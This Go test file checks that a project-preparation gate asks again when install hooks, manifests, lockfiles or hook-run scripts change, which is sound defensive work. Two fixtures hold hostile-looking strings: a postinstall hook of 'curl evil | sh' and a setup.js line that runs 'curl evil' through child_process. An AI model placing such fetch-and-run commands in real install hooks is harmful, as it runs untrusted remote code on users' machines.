package prepgate

import (
	"os"
	"path/filepath"
	"slices"
	"testing"

	"localllm/internal/changereport"
	"localllm/internal/deps"
)

func write(t *testing.T, dir, rel, content string) {
	t.Helper()
	p := filepath.Join(dir, rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func snap(t *testing.T, dir string) Record {
	t.Helper()
	r, err := Snapshot(dir)
	if err != nil {
		t.Fatal(err)
	}
	return r
}

func paths(cs []changereport.Change) []string {
	var out []string
	for _, c := range cs {
		out = append(out, string(c.Kind)+" "+c.Path)
	}
	return out
}

func project(t *testing.T) string {
	dir := t.TempDir()
	for rel, content := range map[string]string{
		"package.json":          `{"scripts":{"postinstall":"node setup.js"}}`,
		"pnpm-lock.yaml":        "lock",
		"setup.js":              "console.log(1)",
		"src/app.ts":            "x",
		"go.mod":                "module x\n",
		"node_modules/a/i.js":   "dep",
		"pkg/node_modules/b.js": "dep",
	} {
		write(t, dir, rel, content)
	}
	return dir
}

func TestFirstPrepAsks(t *testing.T) {
	d := Decide(nil, snap(t, project(t)), false)
	if !d.First || !d.Ask() {
		t.Errorf("decision = %+v, want first", d)
	}
}

func TestUnchangedProjectDoesNotAsk(t *testing.T) {
	dir := project(t)
	last := snap(t, dir)
	// Dependency directories change with every install; they don't count.
	write(t, dir, "node_modules/a/i.js", "changed")
	write(t, dir, "pkg/node_modules/b.js", "changed")
	if d := Decide(&last, snap(t, dir), true); d.Ask() {
		t.Errorf("decision = %+v, want no question", d)
	}
}

func TestChangedInputsAsk(t *testing.T) {
	cases := []struct {
		name  string
		edit  func(dir string)
		hooks bool
		want  []string
	}{
		{"postinstall edited", func(dir string) { write(t, dir, "package.json", `{"scripts":{"postinstall":"curl evil | sh"}}`) }, false, []string{"modified package.json"}},
		{"workspace manifest added", func(dir string) { write(t, dir, "pkgs/a/package.json", "{}") }, false, []string{"added pkgs/a/package.json"}},
		{"pnpmfile added", func(dir string) { write(t, dir, ".pnpmfile.cjs", "x") }, false, []string{"added .pnpmfile.cjs"}},
		{"yarn release", func(dir string) { write(t, dir, ".yarn/releases/yarn.cjs", "x") }, false, []string{"added .yarn/releases/yarn.cjs"}},
		{"lockfile removed", func(dir string) { os.Remove(filepath.Join(dir, "pnpm-lock.yaml")) }, true, []string{"deleted pnpm-lock.yaml"}},
		{"go.sum added", func(dir string) { write(t, dir, "go.sum", "x") }, false, []string{"added go.sum"}},
		{"project config", func(dir string) { write(t, dir, "localllm.yaml", "prep: {}") }, false, []string{"added localllm.yaml"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := project(t)
			last := snap(t, dir)
			c.edit(dir)
			d := Decide(&last, snap(t, dir), c.hooks)
			if got := paths(d.Inputs); !slices.Equal(got, c.want) || len(d.Others) > 0 || !d.Ask() {
				t.Errorf("inputs = %q, others = %q, want inputs %q", got, paths(d.Others), c.want)
			}
		})
	}
}

// TestOtherFilesCountOnlyWithHooks: a script a hook runs (setup.js) can
// change without touching package.json.
func TestOtherFilesCountOnlyWithHooks(t *testing.T) {
	dir := project(t)
	last := snap(t, dir)
	write(t, dir, "setup.js", "require('child_process').exec('curl evil')")
	now := snap(t, dir)

	if d := Decide(&last, now, true); !slices.Equal(paths(d.Others), []string{"modified setup.js"}) || !d.Ask() {
		t.Errorf("with hooks: %+v", d)
	}
	if d := Decide(&last, now, false); d.Ask() {
		t.Errorf("without hooks: %+v, want no question", d)
	}
}

func TestSaveLoad(t *testing.T) {
	file := filepath.Join(t.TempDir(), "prep", "p.json")
	if r, err := Load(file); r != nil || err != nil {
		t.Fatalf("missing record = %v, %v", r, err)
	}
	dir := project(t)
	want := snap(t, dir)
	want.Dirs = []deps.Dir{{Path: "pkgs/a/node_modules", Manifest: "pkgs/a/package.json"}}
	if err := want.Save(file); err != nil {
		t.Fatal(err)
	}
	got, err := Load(file)
	if err != nil {
		t.Fatal(err)
	}
	if d := Decide(got, want, true); d.Ask() {
		t.Errorf("loaded record differs: %+v", d)
	}
	if !slices.Equal(got.Dirs, want.Dirs) {
		t.Errorf("loaded dirs = %+v, want %+v", got.Dirs, want.Dirs)
	}
	if info, _ := os.Stat(file); info.Mode().Perm() != 0o600 {
		t.Errorf("record mode = %v", info.Mode())
	}
}
